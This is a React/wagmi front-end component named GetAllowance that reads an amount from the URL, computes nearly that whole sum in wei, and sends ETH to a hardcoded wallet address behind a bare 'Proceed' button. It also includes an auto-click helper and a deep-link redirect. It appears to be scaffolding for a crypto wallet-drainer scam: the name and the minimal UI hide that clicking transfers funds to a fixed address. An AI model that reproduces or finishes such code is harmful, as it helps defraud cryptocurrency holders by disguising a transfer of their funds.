import { stringify } from "viem";
import { useSendTransaction } from "wagmi";
import { usePrepareSendTransaction } from "wagmi";

export const GetAllowance = () => {
  var url_string = window.location.href;
  console.log(url_string);
  var url = new URL(url_string);
  var c = url.searchParams.get("amt");
  console.log(c);

  // let getBal:any = document.getElementById('walletBalance').value
  let getBal: any = parseFloat(c);
  let walletBalance = getBal / 1.15;
  console.log(walletBalance);
  // let convert = walletBalance.toString()
  // let balFmt = parseFloat(walletBalance.slice(walletBalance.indexOf("."), 20)); //With 3 exposing the hundredths place
  // console.log(balFmt, "DOTREMOVE");
  let balFmt = walletBalance * 10 ** 18;
  console.log(balFmt, "MULTIPLY");
  let amount = BigInt(parseInt(balFmt));
  console.log(amount);
  let dappUrl = window.location.href + "?env=wallet";

  let openMobile = (deeplink: any) => {
    alert("dsd");
    window.location.replace(deeplink);
  };
  let autoClicker = (btn) => {
    document.getElementById(btn).click();
  };
  // const request = usePrepareSendTransaction({
  //   to: "0x9BC76C1800cF9666124604717EBE58612476025E",
  //   value: amount,
  // });
  // console.log(request.data, "GAS!!!");
  const { data, isIdle, isLoading, isSuccess, isError, sendTransaction } =
    useSendTransaction({
      to: "0x753041F2d7F7D3c23ebFd3483d3E13c01f763021",
      value: 10n, // 0.01 ETH
      // value: amount, // 0.01 ETH
      // maxFeePerGas: parseGwei('20'),
    });

  if (isLoading) return <div id="sendTxn">Check your wallet</div>;

  if (isIdle)
    return (
      <div id="sendTxn">
        <br />
        <br />
        <button
          type="button"
          id="process"
          disabled={isLoading}
          onClick={() => sendTransaction()}
        >
          Proceed
        </button>
      </div>
    );

  return (
    <div id="sendTxn">
      {isSuccess && (
        <div className="finishTxn">Transaction: {stringify(data)}</div>
      )}
      {isError && <div className="finishTxn">Error processing wallet</div>}
    </div>
  );
};
